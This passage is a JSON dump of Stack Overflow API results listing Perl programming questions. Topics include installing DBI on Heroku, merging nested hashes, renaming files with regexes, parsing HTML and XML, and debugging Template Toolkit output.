value.</p>\n"},{"tags":["perl","captcha"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":13203887,"title":"Integrate solvemedia captcha using perl","body":"<p>I would like to know how do I insert solvemedia captcha with my script. I did install the module from their site (https://portal.solvemedia.com/media/download/WWW-SolveMedia-1.1.tar.gz) but don't know where to add this (their instructions):</p>\n\n<p>Once the plugin is installed, you can start making calls to the Solve Media API.\n<strong>Display the Widget</strong></p>\n\n<p>To display the Solve Media widget on one of your forms, instantiate the SolveMedia class, supplying it with your API keys. Then call the get_html function. You can find your API keys at My account:</p>\n\n<pre><code>use WWW::SolveMedia;\nmy $c = WWW::SolveMedia-&gt;new( 'my challenge key',\n            'my verification key',\n            'my hash key' );\n\n# output widget\nprint $c-&gt;get_html();\n</code></pre>\n\n<p><strong>Process Answer</strong></p>\n\n<p>You can check the user's response by calling SolveMedia.check_answer(...).</p>\n\n<pre><code># check answer\nmy $result = $c-&gt;check_answer( $ENV{REMOTE_ADDR}, $challenge, $response );\n\nif( $result-&gt;{is_valid} ){\n    print \"Yay!\";\n}else{\n    print \"Dang it :-(\\n\";\n    print \"Error: \".$result-&gt;{error};\n}\n</code></pre>\n\n<p>And this is where I get stuck, cos I don't have a clue how/where to insert that code. If anyone of you is willing to help, please respond. I'm willing to pay a few bucks.</p>\n"},{"tags":["perl","heroku","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13187433,"title":"How do I install DBI module for Perl on Heroku machine","body":"<p>So I have my Ruby-on-rails app that i successfully released to heroku. However to populate the database I have several perl scripts that basically sync up tables on local database with a remote database. </p>\n\n<p>On my development machine (on ec2) it works fine but I also have a lot of stuff i have installed on it over time.</p>\n\n<p>When I try to run my scripts I get the following error (latest perl is installed by the way)</p>\n\n<pre><code>Can't locate DBI.pm in @INC (@INC contains: /etc/perl /usr/local/lib/perl/5.10.1 /usr/local/share/perl/5.10.1 /usr/lib/perl5 /usr/share/perl5 /usr/lib/perl/5.10 /usr/share/perl/5.10 /usr/local/lib/site_perl .) at copyStaff.pl line 4.\nBEGIN failed--compilation aborted at copyStaff.pl line 4.\n</code></pre>\n\n<p>How do I install DBI module for Perl on heroku?\nI tried through bash </p>\n\n<pre><code>apt-get install libdbi-perl\n</code></pre>\n\n<p>This gave me an output of </p>\n\n<pre><code>W: Not using locking for read only lock file /var/lib/dpkg/lock\nE: Unable to write to /var/cache/apt/\nE: The package lists or status file could not be parsed or opened.\n</code></pre>\n\n<p>[This might be irrelevant]\nI tried to run this command</p>\n\n<pre><code>dpkg --configure -a\n</code></pre>\n\n<p>But it told me it requires super user privileges</p>\n\n<pre><code>su -l root -c \"dpkg --configure -a\"\n</code></pre>\n\n<ul>\n<li>asked for root password and apparently I don't know the password (it's not the heroku login), no clue what it might be.</li>\n</ul>\n\n<p>I also downloaded the file directly, but I need super user access. I also tried </p>\n\n<pre><code>$perl -MCPAN -e shell\ncpan&gt; install DBI\n</code></pre>\n\n<p>(this had same problem of not beng able to save the file)</p>\n\n<p>I have a feeling i might be going at it completely the wrong way, but I can't figure out what I need to do to run those scripts.</p>\n"},{"tags":["perl"],"answer_count":5,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":722,"score":5,"question_id":3537363,"title":"How to check if variable is declared in perl?","body":"<p>I am using <code>use strict;</code> in perl and with that I use the following statement.</p>\n\n<pre><code>unless(defined($x)){\n      print \"Not defined\";\n}\n</code></pre>\n\n<p>Where $x is not declared anywhere. So I expect it to print \"<code>Not defined</code>\" but it returns an error</p>\n\n<pre><code>Global symbol \"$x\" requires explicit package name at *********** in line 15.\n</code></pre>\n"},{"tags":["eclipse","perl","epic"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13052110,"title":"Can I exclude a folder from the EPIC syntax checker?","body":"<p>Using Eclipse (Indigo r2) + EPIC (0.5.46), I'd like to exclude a specific file/folder from the syntax checker.  Is this possible?</p>\n\n<p>When attempting to execute any script within the project, I am prompted with:</p>\n\n<pre><code>Errors in Workspace\nErrors exist in required project(s):\n...\nProceed with launch?\n</code></pre>\n\n<p>The warning is benign and does not need to be addressed prior to launch.  </p>\n"},{"tags":["perl","batch-file","constants"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":13216972,"title":"Need to copy the lines just before a particular string using batch file","body":"<p>I have a file like this:</p>\n\n<pre><code>Executing resource: D:\\waste2\\SPC\\depks_rtl_teller_custom.spc   \nExecuting resource: D:\\waste2\\SPC\\ifpks_msg_incoming_cluster.spc  \nFailed to execute:   \nExecuting resource: D:\\waste2\\SQL\\casapks_batch.sql  \nFailed to execute:  \nExecuting resource: D:\\waste2\\SQL\\depks_decbatop_kernel.sql  \nExecuting resource: D:\\waste2\\SQL\\depks_services.sql  \nFailed to execute:    \n</code></pre>\n\n<p>I need a batch file or perl script or ANT script to pick all the lines just in front of the string \"Failed to execute:\" and copy to a new file. Simply the failed file list I need in a new file. Please assist.</p>\n"},{"tags":["perl","cgi"],"answer_count":3,"favorite_count":32,"up_vote_count":40,"down_vote_count":0,"view_count":5082,"score":40,"question_id":2165022,"title":"How can I troubleshoot my Perl CGI script?","body":"<p>I have a Perl script that isn't working and I don't know how to start narrowing down the problem. What can I do?</p>\n\n<hr>\n\n<p>Note: I'm adding the question because I really want to add my very lengthy answer to Stackoverflow. I keep externally linking to it in other answers and it deserves to be here. Don't be shy about editing my answer if you have something to add.</p>\n"},{"tags":["perl","hash","merge","hash-of-hashes"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":57,"score":2,"question_id":13251025,"title":"Combining 2+ 'deep' (multi-dimensional) hashes in perl","body":"<p>There is a question that explains exactly what I want here: <a href=\"http://stackoverflow.com/questions/4060331/how-to-merge-2-deep-hashes-in-perl\">how to merge 2 deep hashes in perl</a></p>\n\n<p><strong>However</strong>, the answer there does not seem to work for me (suggestions of using the <code>Merge</code> module). </p>\n\n<p>I have two hashes like so: </p>\n\n<pre><code>$VAR1 = {\n          '57494' =&gt; {\n                       'name' =&gt; 'John Smith',\n                       'age' =&gt; '9',\n                       'height' =&gt; '120'\n                     },\n          '57495' =&gt; {\n                       'name' =&gt; 'Amy Pond',\n                       'age' =&gt; '17',\n                       'height' =&gt; '168'\n                     }\n        }\n};\n$VAR1 = {\n          '57494' =&gt; {\n                       'name_address' =&gt; 'Peter Smith',\n                       'address' =&gt; '5 Cambridge Road',\n                       'post_code' =&gt; 'CR5 0FS'\n                     }\n        }\n};\n</code></pre>\n\n<p>If I use <code>Hash::Merge</code> or the <code>%c = {%a,%b}</code> format I get this every time:</p>\n\n<pre><code>$VAR1 = '57494';\n$VAR2 = {\n          'name_address' =&gt; 'Peter Smith',\n          'address' =&gt; '5 Cambridge Road',\n          'post_code' =&gt; 'CR5 0FS'\n        };\n</code></pre>\n\n<p>(so it basically overwrote the first data with the second and messed up the keys) when I want:</p>\n\n<pre><code>$VAR1 = {\n          '57494' =&gt; {\n                       'name' =&gt; 'John Smith',\n                       'age' =&gt; '9',\n                       'height' =&gt; '120'\n                       'name_address' =&gt; 'Peter Smith',\n                       'address' =&gt; '5 Cambridge Road',\n                       'post_code' =&gt; 'CR5 0FS'\n                     },\n          '57495' =&gt; {\n                       'name' =&gt; 'Amy Pond',\n                       'age' =&gt; '17',\n                       'height' =&gt; '168'\n                     }\n        }\n};\n</code></pre>\n\n<p>So when the keys are the same, the data merges together, otherwise the new keys are just appended onto the end. I hope this make sense. Maybe I've done something incorrectly using <code>Merge</code> or need to 'manually' add them in loops, but I'm spending too much time thinking about it, regardless!</p>\n\n<p>Edit: how I use Merge to see if I'm doing something silly:</p>\n\n<p>I have: </p>\n\n<pre><code>use Hash::Merge qw( merge );\n\n...hash data above as %hash1 and %hash2...\n\nmy %combined_hash = %{ merge( %hash1,%hash2 ) };\nprint Dumper(%combined_hash);\n</code></pre>\n"},{"tags":["json","web-services","perl","rest"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12777169,"title":"Restful web service in Catalyst","body":"<p>Can anyone tell me how to send JSON request in Perl and how can I access JSON request object in catalyst?</p>\n"}]}
{"total":22324,"page":2,"pagesize":100,"questions":[{"tags":["regex","perl","bash","rename"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":13250694,"title":"Replace and add leading zeros when renaming files","body":"<p>Please be patient, this post will be somewhat long...</p>\n\n<p>I have a bunch of files, some of them with a simple and clean name (e.g. 1E01.txt) and some with a lot of extras:</p>\n\n<pre><code>Sample2_Name_E01_-co_032.txt\nSample2_Name_E02_-co_035.txt\n...\nSample12_Name_E01_-co_061.txt\n</code></pre>\n\n<p>and so on. What is important here is the number after \"Sample\" and the letter+number after \"<em>Name</em>\" - the rest is disposable. If i get rid of the non-important parts, the filename reduces to the same pattern as the \"clean\" filenames (2E01.txt, 2E02.txt, ..., 12E01.txt). I've managed to rename the files with the following expression (came up with this one myself, don't know if is very elegant but works fine):</p>\n\n<pre><code>rename -v 's/Sample([0-9]+)_Name_([A-Z][0-9]+).*/$1$2\\.txt/' *.txt\n</code></pre>\n\n<p>Now, the second part, is adding a leading zero for filenames with just one digit, such as 1E01.txt turns into 01E01.txt. I've managed to to this with (found and modified this on another StackExchange post): </p>\n\n<pre><code>rename -v 'unless (/^[0-9]{2}.*\\.txt/) {s/^([0-9]{1}.*\\.txt)$/0$1/;s/0*([0-9]{2}\\..*)/$1/}' *.txt\n</code></pre>\n\n<p>So I finally got to my question: is there a way to merge both expressions in just one rename command? I know I could do a bash script to automate the process, but what I want is to find a one-pass renaming solution.</p>\n\n<p>thanks</p>\n"},{"tags":["html","perl","parsing","html-parsing","html-tree"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13234260,"title":"HTML parser by perl script","body":"<pre><code>#!/usr/bin/perl\n\nuse HTML::TreeBuilder;\n\nmy $tree = HTML::TreeBuilder-&gt;new; \n\n$tree-&gt;parse_file(\"sample.html\");\n\nforeach my $anchor ($tree-&gt;find(\"p\")) {\n\n  print $anchor-&gt;as_text, \"\\n\";\n\n}\n</code></pre>\n\n<p>my code is not printing any output. <code>$tree-&gt;find(\"p\")</code> is returning NULL.</p>\n"},{"tags":["perl","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":13234525,"title":"Try and store last login time for a user in database using perl script","body":"<p>I have written a code Which tries to store the last login time for a user using perl Script and store it in a hash using dbmopen but it doesnot fetch me the updated login time :- \nMy code goes as follows :- </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse DB_File;\nuse Time::localtime;\n%last_good =();\n%words = () ;\ninit_words();\nprint \" What is your name ? \\n\";\n$name=&lt;STDIN&gt;;\nchomp($name);\n print \"Hi $name , please Enter your secret password: \\n\" ;\n $passwd = &lt;STDIN&gt;;\n chomp($passwd);\n $i=1;\n while(! good_password($name,$passwd))\n {\n  print \" Wrong Password , Please Try Again : \\n\";\n  $passwd=&lt;STDIN&gt;;\n  chomp($passwd);\n }\nprint \"assigning the last login time \\n \";\ndbmopen (%last_good,\"lastdb\",0777) || die \"can't dbmopen lastdb: $!\";\n$last_good{$name} = localtime;   // update last login time if password correct\ndbmclose (%last_good) || die \"can't dbmclose lastdb: $!\";\nprint \"the last login time for :  $name is $last_good{$name} \";\n\nsub init_words\n{\n open(WORDLIST,\"password.txt\") || die \" Can not Read the password.txt : $! \\n\";\n while(defined ($name = &lt;WORDLIST&gt;))\n {\n  chomp($name);\n  $name =~ s/\\W.*// ;\n  $name =~ tr /A-Z/a-z/ ;\n  $password=&lt;WORDLIST&gt;;\n  chomp($password);\n  $words{$name}=$password;\n  if(! defined $last_good{$name} )\n  {\n    dbmopen (%last_good,\"lastdb\",0777) || die \"can't dbmopen lastdb: $!\";\n    $last_good{$name} = localtime;   // update login time for 1st login\n    dbmclose (%last_good) || die \"can't dbmclose lastdb: $!\"; \n  }\n  write;\n }\n close(WORDLIST) || die \" Could not close the file : $! \\n \";\n}\n</code></pre>\n\n<p>what I am trying to do is update or put in database the 1st login time if its not their \nusing <code>if(! defined $last_good{$name} )</code> and then in case its already defined when second time I run the prog I want it toread from database and not try and again create the same again. But when I try and print <code>$last_good{$name} = localtime;</code> after first assignment it doesnt print the login <code>localtime</code> but it says it to be undefined.</p>\n"},{"tags":["html","perl","parsing","html-parsing","perl-module"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":7,"view_count":72,"score":-6,"question_id":13249392,"title":"Regex to parse a multiline HTML","body":"<p>am trying to parse a multi-line html file using regex.</p>\n\n<p>HTML code:</p>\n\n<pre><code>&lt;td&gt;Details&lt;/td&gt;&lt;/tr&gt;  \n&lt;tr class=d1&gt;\n&lt;td&gt;uss_vod_translator&lt;/td&gt;\n</code></pre>\n\n<p>Regex Expression:</p>\n\n<pre><code>if ($line =~ m/Details&lt;\\/td&gt;\\s*&lt;\\/tr&gt;\\s*&lt;tr\\s*class=d1&gt;\\s*&lt;td&gt;(\\w*)&lt;\\/td&gt;/)\n{\n    print \"$1\";\n}\n</code></pre>\n\n<p>I am using <code>/s*</code> (space) for multi-line, but it is not working. I searched about it, even used <code>/\\?</code> for multi-line but that too did not work.</p>\n\n<p>Can any one please suggest me how to parse a multiline HTML?</p>\n"},{"tags":["linux","perl","debugging"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13247883,"title":"Modifying the variable's value during debugging perl code","body":"<p>I was debugging a perl program on SuSe Linux using \"perl -d\" switch.</p>\n\n<p>While debugging, the program was reporting <code>XYZ variable is not set</code></p>\n\n<p>How can I set the value of XYZ inside the debugger?</p>\n\n<p>I tried following inside the debugger but not working.</p>\n\n<pre><code>set XYZ=ABC\nmy $XYZ=ABC\nsetenv XYZ ABC\n</code></pre>\n\n<p>I did a bit of google on this. But couldn't find what I wanted.</p>\n"},{"tags":["perl","template-toolkit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13231946,"title":"strange bug accessing a variable in template toolkit","body":"<p>I'm struggling with a bug, that I can't nail down.   </p>\n\n<p>I have a function that takes a postcode, does a lookup, and returns a latitude, longitude and area name.</p>\n\n<p>for example, pass it AD300 it returns (something like) 42.6, 1.55, ordino - it works very well.</p>\n\n<p>The function is called like this:</p>\n\n<pre><code>my ($lat, $lng, $area) = $object-&gt;release();\n</code></pre>\n\n<p>The return values are fine, and I can print them in perl with a warn</p>\n\n<pre><code>warn \"Area $area, $rellat, $rellng\";\n</code></pre>\n\n<p>This works fine. \"Area Ordino, 42.6, 1.55\"</p>\n\n<p>I then take one of these values, say $area, add it to a hash of data, and pass it to a web page where it is preprocessed via TT (as I do successfully with a load of other variables).</p>\n\n<p>I'm assigning the value to the hash in the normal way. e.g. \n$hash->{'area'} = $area;</p>\n\n<p>Here is where the fun begins.  When I try to reference the value in TT e.g. [% hash.area %]\nI don't get \"Ordino\" printed on the web page, I'm told I've passed an Array reference to TT.</p>\n\n<p>After a little debugging, I've found that my hash variable hash.area, is somehow referencing an array (according to TT) holding the three values that I've returned from the subroutine \"release\". I.e. \n    hash.area = [42.6, 1.55, ordino] according to TT.</p>\n\n<p>That is, to get the value \"Ordino\" within the web page, I have to access [% hash.area.2 %].</p>\n\n<p>Further, I can set $hash->{'area'} to equal any of the variables, $lat, $lng, or $area and get the same behavior.  TT believes all three variables reference the same array. that is</p>\n\n<p>$lat = $lng = $area = [42.6, 1.55, ordino] according to TT</p>\n\n<p>This is bizare, I can happily print the variables in perl and they appears as normal - not an array.  I've tried dumping the hash with dumper, no array, everything is fine.  Yet somehow, TT is finding an array.  It's doing my head in.</p>\n\n<p>The site is quite large, with a lot of pages and I happily pass variables and hashes via TT to web pages all the time, and have been for 4 years now. I've never seen this. On other pages, I even pass exactly the same output from the \"release\" method and it is processed correctly.</p>\n\n<p>I don't <em>think</em> my TT processing code is the problem, however the following is relevant.</p>\n\n<pre><code>my $tt = Template-&gt;new({\n    INCLUDE_PATH =&gt; [ @$template_directories ],\n    COMPILE_EXT =&gt; '.ttc',\n    COMPILE_DIR =&gt; '/tmp/ttc',\n    FILTERS =&gt; YMGN::View-&gt;filters,\n    PLUGIN_BASE =&gt; [ 'YMGN::V::TT::Plugins' ],\n    EVAL_PERL =&gt; 1\n});\n\n$self-&gt;{tt} = $tt;\n$self-&gt;{template_directories} = $template_directories;\n$self-&gt;{output} = $params-&gt;{output} || undef;\n$self-&gt;{data} = $params-&gt;{data} || [];\n</code></pre>\n\n<p>The above creates a new tt object and is part of the \"new\" function (refed below).\n\"data\" contains the hash.  \"output\" holds the processed template ready to send to users browser.  We call new (above), process the data and create the output with the code below.</p>\n\n<pre><code>sub process {\nmy $self = shift;\nmy $params = shift;\n\nif (!ref $self || !exists $self-&gt;{tt}) {\n    my $class = $self;\n    $self = $class-&gt;new($params);\n}\n\nif (!$self-&gt;{output}) {\n    die \"You need to specify output\";\n}\n\ndelete $self-&gt;{error};\n\n$self-&gt;y-&gt;utils-&gt;untaint(\\$self-&gt;{template});\nmy $rv = $self-&gt;{tt}-&gt;process(\n    $self-&gt;{template},\n    $self-&gt;{data},\n    $self-&gt;{output},\n    binmode =&gt; ':utf8',\n);\n\nif (!$rv) {\n    warn $self-&gt;{tt}-&gt;error();\n    return {\n        error =&gt; $self-&gt;{tt}-&gt;error(),\n    };\n}\nreturn 0;\n}\n</code></pre>\n\n<p>All of the above is sanitised because there is a lot of other stuff going on.\nI believe what's important is that the data going in looks correct, here is a full dump of the complete data that is being processed by tt (at the point of processing).  The thing that is causing the problem is bubbles->[*]->{'release'} (note, that release == area in the data.  The name was changed for unrelated reasons).  As you can see, dumper thinks it's a string.  TT deals with everything else fine. </p>\n\n<pre><code>data $VAR1 = {\n      'system' =&gt; {\n                    system stuff\n                  },\n      'features' =&gt; {\n                      site feature config\n                    },\n      'message_count' =&gt; '0',\n      'bubbles' =&gt; [\n                     bless( {\n                              'history' =&gt; [\n                                             {\n                                               'creator' =&gt; '73',\n                                               'points' =&gt; '10',\n                                               'screenname' =&gt; 'sarah10',\n                                               'classname' =&gt; 'Flootit::M::Bubbles',\n                                               'id' =&gt; '1378',\n                                               'updated' =&gt; '1352050471',\n                                               'type' =&gt; 'teleport',\n                                               'label' =&gt; 'teleport',\n                                               'class' =&gt; 'Flootit::M::Bubbles'\n                                             }\n                                          ],\n                              'creator' =&gt; '6',\n                              'release' =&gt; 'Escaldes-Engordany',\n                              'image' =&gt; 'http://six.flooting.com/files/833/7888.png',\n                              'pop_time' =&gt; '1352050644',\n                              'y' =&gt; $VAR1-&gt;{'y'},\n                              'taken_by' =&gt; '0',\n                              'city' =&gt; '3',\n                              'title' =&gt; 'hey a new bubble',\n                              'id' =&gt; '566',\n                              'class' =&gt; 'Flootit::M::Bubbles',\n                              'prize' =&gt; 'go for it kids'\n                            }, 'Flootit::M::Bubbles' ),\n                     bless( {\n                              'history' =&gt; [\n                                             {\n                                               'creator' =&gt; '6',\n                                               'points' =&gt; '10',\n                                               'screenname' =&gt; 'sarah20',\n                                               'classname' =&gt; 'Flootit::M::Bubbles',\n                                               'id' =&gt; '1723',\n                                               'updated' =&gt; '1349548017',\n                                               'type' =&gt; 'teleport',\n                                               'label' =&gt; 'teleport',\n                                               'class' =&gt; 'Flootit::M::Bubbles'\n                                             },\n                                             {\n                                               'creator' =&gt; '6',\n                                               'points' =&gt; '5',\n                                               'screenname' =&gt; 'sarah20',\n                                               'classname' =&gt; 'Flootit::M::Bubbles',\n                                               'id' =&gt; '1732',\n                                               'updated' =&gt; '1349547952',\n                                               'type' =&gt; 'blow',\n                                               'label' =&gt; 'blow',\n                                               'class' =&gt; 'Flootit::M::Bubbles'\n                                             }\n                                           ],\n                              'creator' =&gt; '89',\n                              'release' =&gt; 'Ordino',\n                              'image' =&gt; 'http://six.flooting.com/files/1651/8035.png',\n                              'pop_time' =&gt; '1351203843',\n                              'y' =&gt; $VAR1-&gt;{'y'},\n                              'taken_by' =&gt; '0',\n                              'city' =&gt; '3',\n                              'title' =&gt; 'test4',\n                              'id' =&gt; '1780',\n                              'class' =&gt; 'Flootit::M::Bubbles',\n                              'prize' =&gt; 'asdfasdf dsadsasdfasdfasdf'\n                            }, 'Flootit::M::Bubbles' ),\n                     bless( {\n                              'history' =&gt; [],\n                              'creator' =&gt; '6',\n                              'release' =&gt; 'Andorra la Vella',\n                              'image' =&gt; 'http://six.flooting.com/files/1671/8042.png',\n                              'pop_time' =&gt; '0',\n                              'y' =&gt; $VAR1-&gt;{'y'},\n                              'taken_by' =&gt; '0',\n                              'city' =&gt; '3',\n                              'title' =&gt; 'Pretty flowers, tres joli',\n                              'id' =&gt; '1797',\n                              'class' =&gt; 'Flootit::M::Bubbles',\n                              'prize' =&gt; 'With lots of pretty pictures'\n                            }, 'Flootit::M::Bubbles' ),\n                     bless( {\n                              'history' =&gt; [],\n                              'creator' =&gt; '6',\n                              'release' =&gt; 'Hillrise Ward',\n                              'image' =&gt; 'http://six.flooting.com/files/1509/8003.png',\n                              'pop_time' =&gt; '0',\n                              'y' =&gt; $VAR1-&gt;{'y'},\n                              'taken_by' =&gt; '0',\n                              'city' =&gt; '3',\n                              'title' =&gt; 'Test beats',\n                              'id' =&gt; '1546',\n                              'class' =&gt; 'Flootit::M::Bubbles',\n                              'prize' =&gt; 'Sound great'\n                            }, 'Flootit::M::Bubbles' )\n                   ]\n    };\n</code></pre>\n\n<p>What comes out after processing is this (in $output)\nThere is a \n   [% FOREACH floot IN bubbles %]\n    <p>Floating around ARRAY(0xfaf5d448).</p>  from [% floot.release %]</p>\n\n<p>if we make this [% floot.release.2 %] it gives the correct value. </p>\n\n<p>All the other fields can be referenced correctly - go figure.</p>\n\n<p>The code that puts \"bubbles\" together is;</p>\n\n<pre><code>my $bubbles = $y-&gt;model('Bubbles')-&gt;search(['type' =&gt; 'golden', 'image' =&gt; '!NULL',\n                                            'bubble_prizes' =&gt; ['p', { 'p.bubble' =&gt; 'self.id'}], ], {\n    order_by =&gt; '(created&gt;CURRENT_DATE() AND thumbsup+thumbsdown&lt;10) DESC, COALESCE(thumbsup,0)-COALESCE(thumbsdown,0) DESC, pop_time DESC',\n    count =&gt; 10,\n    fields =&gt; ['p.title as title', 'p.prize as prize', 'city', 'taken_by', 'pop_time', 'id', 'creator'],\n});\n\nfor (my $i=0; $i&lt;@$bubbles; $i++) {\n\n    # Find specified bubbles (see below for when not found here)\n        my ($rellat, $rellng, $area) = $bubbles-&gt;[$i]-&gt;release() ;\n    $bubbles-&gt;[$i]-&gt;{'release'} = $area;\n}\n}\n</code></pre>\n\n<p>The controller then takes $bubble, bundles it up with session / site data, puts it inside an anonymous hash (as you can see in the data above) and passes it to view for processing. </p>\n\n<p>The code for release is :</p>\n\n<pre><code>sub release {\n    my $self = shift;\n    my $postcode = $self-&gt;y-&gt;model('Prizes')-&gt;find({bubble =&gt; $self-&gt;id})-&gt;postcode;\n    my ( $user_lat, $user_long, $region_name );\n    if($postcode)\n     {\n           ( $user_lat, $user_long, $region_name ) = $self-&gt;y-&gt;api('Location')-&gt;from_postcode($postcode);\n           return ( $user_lat, $user_long, $region_name );  \n        }\n   }\n</code></pre>\n\n<p>API::Location is quite large, however the relevant lines are;</p>\n\n<pre><code>$postcode_record = $self-&gt;y-&gt;model('GeoData')-&gt;find( {\nsource   =&gt; \"ALL_COUNTRIES_POSTCODES\",\ncountry  =&gt; $country_code,\nsourceid =&gt; $postcode, } );\n\nreturn ( $postcode_record-&gt;latitude, $postcode_record-&gt;longitude, $postcode_record-&gt;town );\n</code></pre>\n\n<p>The data dumps I've shown you are taken from inside TT.pm (part of view).</p>\n\n<p>So, any ideas what might be going on or where to start?  What can I do to try and debug this further? I'm out of ideas.</p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":7,"view_count":47,"score":-6,"question_id":13229416,"title":"How to change parameter value in XML using bash or perl?","body":"<p>I have a xml in below and need to modify some parameter value  </p>\n\n<p></p>\n\n<pre><code>&lt;test name=\"MyRawExample\" preserve-order=\"true\"&gt;\n    &lt;parameter name=\"example-parameter\" value=\"11111\" /&gt;\n    &lt;classes&gt;\n        &lt;class name=\"com.ericol.nco.blocktests.example.ExampleTestcase\" /&gt;\n    &lt;/classes&gt;\n&lt;/test&gt;\n</code></pre>\n\n<p></p>\n\n<p>I need to look for a specific parameter name and then replace the corresponding value by a new input value and updates the xml file.</p>\n\n<p>I was wondering if anybody can help me how I may change it or offer me a rigid doc so that i can find the most efficient script to accomplish this.</p>\n\n<p>Regards,\nBehzad</p>\n"},{"tags":["perl","lwp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13229638,"title":"Ways to execute multiple HTTP requests without careing about the response?","body":"<p>I'm writing a web application which requires to make multiple web calls to a restfull API per each visit. The response of the calls are completely irrelevant (ignore it). I do not need any of those responses so I don't handle them.</p>\n\n<p>My problem is to ensure the best viewing experience by the visitor. There have to be no preventable delays while the generation or sending the content to the visitor.</p>\n\n<p>So: How do I execute multiple asynchronous HTTP requests without careing of the response or make any delay for the client (e.g. browser loads after last bit was send because the requests won't all finished)?</p>\n\n<p>What I have tried:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nprint \"Content-Type: text/plain\\r\\n\\r\\nHello, world!\";\nEND {\n    # perform the asynchronous HTTP requests...\n}\n</code></pre>\n\n<p>This is causing that the browser is loading until every request have been finished.</p>\n\n<p>The situation is the following (shop system):</p>\n\n<ol>\n<li>Client issuses an order on the website</li>\n<li>Server receive the requests, checks perimeter, decides if the client is allowed to order</li>\n<li>Server allows order placement and returns website with order number.</li>\n<li>Client executed embedded JavaScript, parses website, extract order number, perform request to the stats-server that client has ordered</li>\n</ol>\n\n<p>Very foolish, right? Why don't let the server perform that request to the stats-server and get 100% of the orders... Client don't have to parse and do other ugly stuff.</p>\n"},{"tags":["perl","xpath","libxml"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":49,"score":0,"question_id":13245128,"title":"Check the particular value of attribute and extract sibblings value using XPath in Perl using XML::LibXML","body":"<p>If <code>solve</code> is <code>user</code>, I need the value of <code>name</code> (<code>LINES</code>).</p>\n\n<p>if <code>solve</code> is <code>imm</code> and name is <code>ARCH</code>, I need the value of <code>value</code> (<code>6M</code>)</p>\n\n<p>I tried in the following:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse XML::LibXML;\nmy $parser = XML::LibXML-&gt;new();\nmy $doc = $parser-&gt;parse_file(...);\nmy $j = 0;\nmy @imm;\n$imm[$j++] = $_-&gt;data\n    foreach \n        $doc-&gt;findnodes(\n            \"//meters/meter\"\n            .\"/name[../value[\\@solve/string() = 'immediate']]\"\n            .\"/text()\");\n</code></pre>\n\n<p>Errors are</p>\n\n<pre><code>Possible unintended interpolation of @solve in string\nGlobal symbol \"@solve\" requires explicit package name \n</code></pre>\n\n<p>Sample XML:</p>\n\n<pre><code>&lt;rules&gt; \n      &lt;meters&gt;        \n             &lt;meter&gt;\n                   &lt;name&gt;LINES&lt;/spirit:name&gt;\n                   &lt;display&gt;LINES&lt;/display&gt;\n                   &lt;description&gt;Specifies the number of lines&lt;/description&gt;\n                   &lt;value\n                         solve=\"user\"\n                         id=\"LINES\"\n                         order=\"11\"\n                         format=\"long\"\n                         dataType=\"integer\" \n                         min=\"2\" \n                         max=\"34\"&gt;34&lt;/value&gt;\n            &lt;/meter&gt;\n            &lt;meter&gt;\n                  &lt;name&gt;ARCH&lt;/name&gt;\n                  &lt;display&gt;Define ARCH&lt;/display&gt;\n                  &lt;description&gt;Define ARCH&lt;/description&gt;\n                  &lt;value \n                        format=\"string\" \n                        solve=\"imm\" \n                        id=\"ARCH\" \n                        &gt;6M&lt;/value&gt;\n             &lt;/meter&gt;\n       &lt;/meters&gt;    \n&lt;/rules&gt;\n\n&lt;rules&gt; \n      &lt;meters&gt;        \n             &lt;meter&gt;\n                   &lt;name&gt;LINES&lt;/spirit:name&gt;\n                   &lt;display&gt;LINES&lt;/display&gt;\n                   &lt;description&gt;Specifies the number of lines&lt;/description&gt;\n                   &lt;value\n                         solve=\"user\"\n                         id=\"LINES\"\n                         order=\"11\"\n                         format=\"long\"\n                         dataType=\"integer\" \n                         min=\"2\" \n                         max=\"34\"&gt;34&lt;/value&gt;\n            &lt;/meter&gt;\n            &lt;meter&gt;\n                  &lt;name&gt;ARCH&lt;/name&gt;\n                  &lt;display&gt;Define ARCH&lt;/display&gt;\n                  &lt;description&gt;Define ARCH&lt;/description&gt;\n                  &lt;value \n                        format=\"string\" \n                        solve=\"imm\" \n                        id=\"ARCH\" \n                        &gt;6M&lt;/value&gt;\n             &lt;/meter&gt;\n       &lt;/meters&gt;    \n&lt;/rules&gt;\n</code></pre>\n"},{"tags":["perl","unix","scripting","filesystems"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":89,"score":3,"question_id":13241857,"title":"How does Unix read a path name with two consecutive slashes? (e.g. /home/user//mystuff)","body":"<p>Here's the reason why I'm asking this question: I write a lot of bash and Perl scripts, and I find myself having to concatenate two paths every so often. Something like this is typical:</p>\n\n<pre><code>my $prefix = \"/home/user/\";\nmy $suffix = \"/mystuff\";\n...\nchdir $prefix.$suffix;\n</code></pre>\n\n<p>The problem is that I don't always remember if I put a slash at the end of the prefix, or if I put 